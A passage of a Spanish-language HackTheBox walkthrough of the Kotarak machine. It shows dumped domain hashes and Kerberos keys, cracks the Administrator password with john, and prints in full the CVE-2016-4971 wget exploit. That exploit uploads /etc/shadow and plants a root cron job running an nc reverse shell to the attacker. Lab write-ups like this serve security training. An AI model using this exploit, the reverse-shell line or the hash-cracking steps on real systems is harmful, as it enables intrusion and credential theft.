+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::  
+WIN2K8<span class="nv">$:</span>1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487::: 
+WINXP1<span class="nv">$:</span>1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
+WIN2K31<span class="nv">$:</span>1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
+WIN7<span class="nv">$:</span>1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
+atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::                      
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys from ntds.dit                                                                                                  
+Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2
+Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274                                   
+Administrator:des-cbc-md5:75375eda54757c2f                                                                                       
+WIN-3G2B0H151AC<span class="nv">$:</span>aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233
+WIN-3G2B0H151AC<span class="nv">$:</span>aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74
+WIN-3G2B0H151AC<span class="nv">$:</span>des-cbc-md5:b39dc12a920457d5                                                                                    
+WIN-3G2B0H151AC<span class="nv">$:</span>rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd     
+krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8
+krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593
+krbtgt:des-cbc-md5:10ef08047a862046                                                                                              
+krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee                                                                                 
+WIN2K8<span class="nv">$:</span>aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5
+WIN2K8<span class="nv">$:</span>aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908 
+WIN2K8<span class="nv">$:</span>des-cbc-md5:d352a8d3a7a7380b                                                                                             
+WIN2K8<span class="nv">$:</span>rc4_hmac:160f6c1db2ce0994c19c46a349611487                                                                                
+WINXP1<span class="nv">$:</span>aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14
+WINXP1<span class="nv">$:</span>aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded 
+WINXP1<span class="nv">$:</span>des-cbc-md5:984a40d5f4a815f2                                                                                             
+WINXP1<span class="nv">$:</span>rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279                                                                                
+WIN2K31<span class="nv">$:</span>aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16
+WIN2K31<span class="nv">$:</span>aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734
+WIN2K31<span class="nv">$:</span>des-cbc-md5:4cbf2ad3c4f75b01                                                                                            
+WIN2K31<span class="nv">$:</span>rc4_hmac:cdd7a7f43d06b3a91705900a592f3772            
+WIN7<span class="nv">$:</span>aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42
+WIN7<span class="nv">$:</span>aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7
+WIN7<span class="nv">$:</span>des-cbc-md5:89a1673723ad9180                                                                                               
+WIN7<span class="nv">$:</span>rc4_hmac:24473180acbcc5f7d2731abe05cfa88c                
+atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2
+atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4
+atanas:des-cbc-md5:6b80e391f113542a
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up...  
+</code></pre></div></div>
+
+<p>Tenemos los hashes de varios usuarios, a nostros lo que nos interesan sería <strong>Administrator</strong> y <strong>atanas</strong>; por lo que vamos a crackearlos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn hashes
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
+atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+❯ john <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nt">--format</span><span class="o">=</span>NT hashes
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts <span class="o">(</span>NT <span class="o">[</span>MD4 256/256 AVX2 8x3]<span class="o">)</span>
+Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>8
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+f16tomcat!       <span class="o">(</span>Administrator<span class="o">)</span>
+1g 0:00:00:00 DONE <span class="o">(</span>2021-10-19 16:11<span class="o">)</span> 1.408g/s 20202Kp/s 20202Kc/s 31772KC/s  _ 09..<span class="k">*</span>7¡Vamos!
+Use the <span class="s2">"--show --format=NT"</span> options to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>Ya tenemos la clave del usuario <strong>Administrator</strong>, podríamos probar migrar al usuario <strong>atanas</strong> con dicha contraseña:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat@kotarak-dmz:/home<span class="nv">$ </span>su atanas
+Password: 
+atanas@kotarak-dmz:/home<span class="nv">$ </span><span class="nb">whoami
+</span>atanas
+atanas@kotarak-dmz:/home<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Somo el usuario <strong>atanas</strong> y podemos visualizar la flag (user.txt). Ahora nos queda escalar privilegios, asi que vamos a enumerar un poco el sistema:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>atanas@kotarak-dmz:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>atanas<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>atanas<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>atanas<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,6<span class="o">(</span>disk<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,34<span class="o">(</span>backup<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
+atanas@kotarak-dmz:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span>: unable to resolve host kotarak-dmz: Connection refused
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>atanas: 
+Sorry, user atanas may not run <span class="nb">sudo </span>on kotarak-dmz.
+atanas@kotarak-dmz:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>No vemos nada interesante; pero, algo del prompt nos tiene que llamar la atención: <code class="language-plaintext highlighter-rouge">kotarak-dmz</code>; nos podría estar indicando que nos encontramos en una <strong><em>DMZ</em></strong> y que es necesario tal vez migrar a otro equipo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>atanas@kotarak-dmz:~<span class="nv">$ </span><span class="nb">hostname</span> <span class="nt">-I</span>
+10.10.10.55 10.0.3.1 
+atanas@kotarak-dmz:~<span class="nv">$ </span>ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:62:43  
+          inet addr:10.10.10.55  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:feb9:6243/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:112910 errors:0 dropped:101 overruns:0 frame:0
+          TX packets:71220 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:12564873 <span class="o">(</span>12.5 MB<span class="o">)</span>  TX bytes:38760014 <span class="o">(</span>38.7 MB<span class="o">)</span>
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:132270 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:132270 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:8946481 <span class="o">(</span>8.9 MB<span class="o">)</span>  TX bytes:8946481 <span class="o">(</span>8.9 MB<span class="o">)</span>
+
+lxcbr0    Link encap:Ethernet  HWaddr 00:16:3e:00:00:00  
+          inet addr:10.0.3.1  Bcast:0.0.0.0  Mask:255.255.255.0
+          inet6 addr: fe80::216:3eff:fe00:0/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:226 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:225 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:10980 <span class="o">(</span>10.9 KB<span class="o">)</span>  TX bytes:12696 <span class="o">(</span>12.6 KB<span class="o">)</span>
+
+lxdbr0    Link encap:Ethernet  HWaddr 2e:a7:d1:f9:1b:07  
+          inet6 addr: fe80::1/64 Scope:Link
+          inet6 addr: fe80::2ca7:d1ff:fef9:1b07/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:5 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:0 <span class="o">(</span>0.0 B<span class="o">)</span>  TX bytes:470 <span class="o">(</span>470.0 B<span class="o">)</span>
+
+veth9D3PL2 Link encap:Ethernet  HWaddr fe:c5:64:80:c9:b1  
+          inet6 addr: fe80::fcc5:64ff:fe80:c9b1/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:226 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:233 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:14144 <span class="o">(</span>14.1 KB<span class="o">)</span>  TX bytes:13344 <span class="o">(</span>13.3 KB<span class="o">)</span>
+
+atanas@kotarak-dmz:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>En las dirección IP de la máquina, vemos una nueva dirección IP <code class="language-plaintext highlighter-rouge">10.10.3.1</code>. Esto nos podría indicar que la máquina se está comunicando con otra y a lo mejor es necesario ingresar a dicha máquina. Esto lo podemos probar ingresando el directorio <code class="language-plaintext highlighter-rouge">/root</code> y tratar de ver la flag</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>atanas@kotarak-dmz:/root<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 8
+<span class="nt">-rw-------</span> 1 atanas root 333 Jul 20  2017 app.log
+<span class="nt">-rw-------</span> 1 atanas root  66 Aug 29  2017 flag.txt
+atanas@kotarak-dmz:/root<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+Getting closer! But what you are looking <span class="k">for </span>can<span class="s1">'t be found here.
+atanas@kotarak-dmz:/root$
+</span></code></pre></div></div>
+
+<p>En dicho directorio, vemos otro archivo; <code class="language-plaintext highlighter-rouge">app.log</code>, vamos a echarle un ojo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>atanas@kotarak-dmz:/root<span class="nv">$ </span><span class="nb">cat </span>app.log 
+10.0.3.133 - - <span class="o">[</span>20/Jul/2017:22:48:01 <span class="nt">-0400</span><span class="o">]</span> <span class="s2">"GET /archive.tar.gz HTTP/1.1"</span> 404 503 <span class="s2">"-"</span> <span class="s2">"Wget/1.16 (linux-gnu)"</span>
+10.0.3.133 - - <span class="o">[</span>20/Jul/2017:22:50:01 <span class="nt">-0400</span><span class="o">]</span> <span class="s2">"GET /archive.tar.gz HTTP/1.1"</span> 404 503 <span class="s2">"-"</span> <span class="s2">"Wget/1.16 (linux-gnu)"</span>
+10.0.3.133 - - <span class="o">[</span>20/Jul/2017:22:52:01 <span class="nt">-0400</span><span class="o">]</span> <span class="s2">"GET /archive.tar.gz HTTP/1.1"</span> 404 503 <span class="s2">"-"</span> <span class="s2">"Wget/1.16 (linux-gnu)"</span>
+atanas@kotarak-dmz:/root<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos unos logs en donde la máquina 10.10.3.133 trata de descar el recurso <code class="language-plaintext highlighter-rouge">archive.tar.gz</code> con el método GET y se está haciendo uso de <code class="language-plaintext highlighter-rouge">Wget/1.16</code>; por lo que vamos a buscar posibles exploits asociados a dicha tecnología:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit wget 1.16
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+GNU Wget &lt; 1.18 - Access List Bypass / Race Condition                                          | multiple/remote/40824.py
+GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution                                | linux/remote/40064.txt
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>Vamos e echarle un ojo a <code class="language-plaintext highlighter-rouge">linux/remote/40064.txt</code> vía web:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit <span class="nt">-w</span> linux/remote/40064.txt
+<span class="nt">------------------------------------------------------------------------------------</span> <span class="nt">--------------------------------------------</span>
+ Exploit Title                                                                      |  URL
+<span class="nt">------------------------------------------------------------------------------------</span> <span class="nt">--------------------------------------------</span>
+GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution                     | https://www.exploit-db.com/exploits/40064
+<span class="nt">------------------------------------------------------------------------------------</span> <span class="nt">--------------------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>Suponiendo que la máquina tercera está realizando la consulta a intervalos regulares de tiempo, vamos al apartado del exploit <strong>Cronjob with wget scenario</strong>:</p>
+
+<p><img src="/assets/images/htb-kotarak/kotarak-exploit.png" alt="" /></p>
+
+<p>Nos indica que primero debemos crear un archivo <code class="language-plaintext highlighter-rouge">.wgetrc</code> con el siguiente contenido, esto lo haremos en nuestra máquina de atacantes:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>post_file <span class="o">=</span> /etc/shadow
+output_document <span class="o">=</span> /etc/cron.d/wget-root-shell
+</code></pre></div></div>
+
+<p>Despúes tenemos que crearnos un archivo en python: <code class="language-plaintext highlighter-rouge">wget-exploit.py</code> al cual vamos a retocar para ajustarlo a nuestro caso, esto en la máquina víctima modificando los siguientes campos:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTP_LISTEN_IP</span> <span class="o">=</span> <span class="s">'0.0.0.0'</span>
+<span class="n">HTTP_LISTEN_PORT</span> <span class="o">=</span> <span class="mi">80</span>
+<span class="n">FTP_HOST</span> <span class="o">=</span> <span class="s">'10.10.14.16'</span>
+<span class="n">FTP_PORT</span> <span class="o">=</span> <span class="mi">21</span>
+<span class="n">ROOT_CRON</span> <span class="o">=</span> <span class="s">"* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 443 &gt;/tmp/f </span><span class="se">\n</span><span class="s">"</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python                                           
+</span>                                
+<span class="c1">#
+# Wget 1.18 &lt; Arbitrary File Upload Exploit                                                                                      
+# Dawid Golunski                                                
+# dawid( at )legalhackers.com                                                                                                    #           
+# http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
+#                                                                                                                                
+# CVE-2016-4971                                                                                                                  #               
+</span>                                
+<span class="kn">import</span> <span class="nn">SimpleHTTPServer</span>                                         
+<span class="kn">import</span> <span class="nn">SocketServer</span>      
+<span class="kn">import</span> <span class="nn">socket</span><span class="p">;</span>                                                  
+
+<span class="k">class</span> <span class="nc">wgetExploit</span><span class="p">(</span><span class="n">SimpleHTTPServer</span><span class="o">.</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>                                                                    
+   <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+       <span class="c1"># This takes care of sending .wgetrc
+</span>
+       <span class="k">print</span> <span class="s">"We have a volunteer requesting "</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span> <span class="o">+</span> <span class="s">" by GET :)</span><span class="se">\n</span><span class="s">"</span>
+       <span class="k">if</span> <span class="s">"Wget"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">getheader</span><span class="p">(</span><span class="s">'User-Agent'</span><span class="p">):</span>
+          <span class="k">print</span> <span class="s">"But it's not a Wget :( </span><span class="se">\n</span><span class="s">"</span>
+          <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+          <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
+          <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"Nothing to see here..."</span><span class="p">)</span>                                                                             
+          <span class="k">return</span>
+                                                                                                                                 
+       <span class="k">print</span> <span class="s">"Uploading .wgetrc via ftp redirect vuln. It should land in /root </span><span class="se">\n</span><span class="s">"</span>
+       <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">301</span><span class="p">)</span>                                  
+       <span class="n">new_path</span> <span class="o">=</span> <span class="s">'</span><span class="si">%</span><span class="s">s'</span><span class="o">%</span><span class="p">(</span><span class="s">'ftp://anonymous@</span><span class="si">%</span><span class="s">s:</span><span class="si">%</span><span class="s">s/.wgetrc'</span><span class="o">%</span><span class="p">(</span><span class="n">FTP_HOST</span><span class="p">,</span> <span class="n">FTP_PORT</span><span class="p">)</span> <span class="p">)</span>
+       <span class="k">print</span> <span class="s">"Sending redirect to </span><span class="si">%</span><span class="s">s </span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">new_path</span><span class="p">)</span>     
+       <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">'Location'</span><span class="p">,</span> <span class="n">new_path</span><span class="p">)</span> 
+       <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
+                                                                                                                                 
+   <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+       <span class="c1"># In here we will receive extracted file and install a PoC cronjob
+</span>       <span class="k">print</span> <span class="s">"We have a volunteer requesting "</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span> <span class="o">+</span> <span class="s">" by POST :)</span><span class="se">\n</span><span class="s">"</span>
+       <span class="k">if</span> <span class="s">"Wget"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">getheader</span><span class="p">(</span><span class="s">'User-Agent'</span><span class="p">):</span>
+          <span class="k">print</span> <span class="s">"But it's not a Wget :( </span><span class="se">\n</span><span class="s">"</span>
+          <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+          <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
+          <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"Nothing to see here..."</span><span class="p">)</span>
+          <span class="k">return</span>
+
+       <span class="n">content_len</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">getheader</span><span class="p">(</span><span class="s">'content-length'</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+       <span class="n">post_body</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">rfile</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">content_len</span><span class="p">)</span>
+       <span class="k">print</span> <span class="s">"Received POST from wget, this should be the extracted /etc/shadow file: </span><span class="se">\n\n</span><span class="s">---[begin]---</span><span class="se">\n</span><span class="s"> </span><span class="si">%</span><span class="s">s </span><span class="se">\n</span><span class="s">---[eof]---</span><span class="se">\n\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">post_body</span><span class="p">)</span>
+
+       <span class="k">print</span> <span class="s">"Sending back a cronjob script as a thank-you for the file..."</span> 
+       <span class="k">print</span> <span class="s">"It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"</span>
+       <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+       <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">'Content-type'</span><span class="p">,</span> <span class="s">'text/plain'</span><span class="p">)</span>
+       <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
+       <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ROOT_CRON</span><span class="p">)</span>
+
+       <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">File was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) </span><span class="se">\n</span><span class="s">"</span>
+
+       <span class="k">return</span>
+
+<span class="n">HTTP_LISTEN_IP</span> <span class="o">=</span> <span class="s">'0.0.0.0'</span>
+<span class="n">HTTP_LISTEN_PORT</span> <span class="o">=</span> <span class="mi">80</span>
+<span class="n">FTP_HOST</span> <span class="o">=</span> <span class="s">'10.10.14.16'</span>
+<span class="n">FTP_PORT</span> <span class="o">=</span> <span class="mi">21</span>
+
+<span class="n">ROOT_CRON</span> <span class="o">=</span> <span class="s">"* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 443 &gt;/tmp/f </span><span class="se">\n</span><span class="s">"</span>
+
+<span class="n">handler</span> <span class="o">=</span> <span class="n">SocketServer</span><span class="o">.</span><span class="n">TCPServer</span><span class="p">((</span><span class="n">HTTP_LISTEN_IP</span><span class="p">,</span> <span class="n">HTTP_LISTEN_PORT</span><span class="p">),</span> <span class="n">wgetExploit</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"Ready? Is your FTP server running?"</span>
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="n">FTP_HOST</span><span class="p">,</span> <span class="n">FTP_PORT</span><span class="p">))</span>
+<span class="k">if</span> <span class="n">result</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+   <span class="k">print</span> <span class="s">"FTP found open on </span><span class="si">%</span><span class="s">s:</span><span class="si">%</span><span class="s">s. Let's go then</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">FTP_HOST</span><span class="p">,</span> <span class="n">FTP_PORT</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+   <span class="k">print</span> <span class="s">"FTP is down :( Exiting."</span>
+   <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"Serving wget exploit on port </span><span class="si">%</span><span class="s">s...</span><span class="se">\n\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">HTTP_LISTEN_PORT</span>
+
+<span class="n">handler</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Le damos permisos de ejecución al archivo <code class="language-plaintext highlighter-rouge">wget-exploit.py</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>atanas@kotarak-dmz:/dev/shm<span class="nv">$ </span>ll
+total 4
+drwxrwxrwt  2 root   root     60 Oct 19 18:05 ./
+drwxr-xr-x 20 root   root   3980 Oct 19 15:07 ../
+<span class="nt">-rw-rw-r--</span>  1 atanas atanas 2871 Oct 19 18:05 wget-exploit.py
+atanas@kotarak-dmz:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x wget-exploit.py 
+atanas@kotarak-dmz:/dev/shm<span class="nv">$ </span>ll
+total 4
+drwxrwxrwt  2 root   root     60 Oct 19 18:05 ./
+drwxr-xr-x 20 root   root   3980 Oct 19 15:07 ../
+<span class="nt">-rwxrwxr-x</span>  1 atanas atanas 2871 Oct 19 18:05 wget-exploit.py<span class="k">*</span>
+atanas@kotarak-dmz:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Y para poder ejecutarlo, necesitamos de la utilidad <code class="language-plaintext highlighter-rouge">authbind</code>, la cual ya se encuentra dentro del sistema:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>atanas@kotarak-dmz:/dev/shm<span class="nv">$ </span>which authbind
+/usr/bin/authbind
+atanas@kotarak-dmz:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Y además, en la ruta <code class="language-plaintext highlighter-rouge">/etc/authbind/byport</code> tener archivos con nombres asociados a los puertos y como propietario sea <strong>root</strong> y el grupo nuestro usuario, para este caso <strong>atanas</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>atanas@kotarak-dmz:/dev/shm<span class="nv">$ </span>ll /etc/authbind/byport/
+total 8
+drwxr-xr-x 2 root root   4096 Aug 29  2017 ./
+drwxr-xr-x 5 root root   4096 Aug 29  2017 ../
+<span class="nt">-rwxr-xr-x</span> 1 root atanas    0 Aug 29  2017 21<span class="k">*</span>
+<span class="nt">-rwxr-xr-x</span> 1 root atanas    0 Aug 29  2017 80<span class="k">*</span>
+atanas@kotarak-dmz:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Con esto nos permite abrir los puertos indicandos en la ruta <code class="language-plaintext highlighter-rouge">/etc/authbind/byport</code> sin necesidad de contar con privilegios.</p>
+
+<p>Antes de ejecutar el comando anterior, en nuestra máquina de atacantes nos instalamos <code class="language-plaintext highlighter-rouge">pyftpdlib</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ pip2 <span class="nb">install </span>pyftpdlib
+DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="k">for </span>Python 2.7 <span class="k">in </span>January 2021. More details about Python 2 support <span class="k">in </span>pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support <span class="k">for </span>this functionality.
+WARNING: The directory <span class="s1">'/root/.cache/pip'</span> or its parent directory is not owned or is not writable by the current user. The cache has been disabled. Check the permissions and owner of that directory. If executing pip with <span class="nb">sudo</span>, you may want <span class="nb">sudo</span><span class="s1">'s -H flag.
+Collecting pyftpdlib
+  Downloading pyftpdlib-1.5.6.tar.gz (188 kB)
+     |████████████████████████████████| 188 kB 1.2 MB/s 
+Building wheels for collected packages: pyftpdlib
+  Building wheel for pyftpdlib (setup.py) ... done
+  Created wheel for pyftpdlib: filename=pyftpdlib-1.5.6-py2-none-any.whl size=125598 sha256=cc181fa86d37b86ce0a1c10118ce68d67346f767a2c71fdabd44245506eca76a
+  Stored in directory: /tmp/pip-ephem-wheel-cache-N4LzBT/wheels/31/10/b5/c6b2f04e18f1227d0dc45062815ad52ed359ec2e8d6c0faa55
+Successfully built pyftpdlib
+Installing collected packages: pyftpdlib
+Successfully installed pyftpdlib-1.5.6
+</span></code></pre></div></div>
+
+<p>Nos compartimos un servidor FTP con python:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python <span class="nt">-m</span> pyftpdlib <span class="nt">-p21</span> <span class="nt">-w</span>
+/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.
+  RuntimeWarning<span class="o">)</span>
+<span class="o">[</span>I 2021-10-19 17:14:56] concurrency model: async
+<span class="o">[</span>I 2021-10-19 17:14:56] masquerade <span class="o">(</span>NAT<span class="o">)</span> address: None
+<span class="o">[</span>I 2021-10-19 17:14:56] passive ports: None
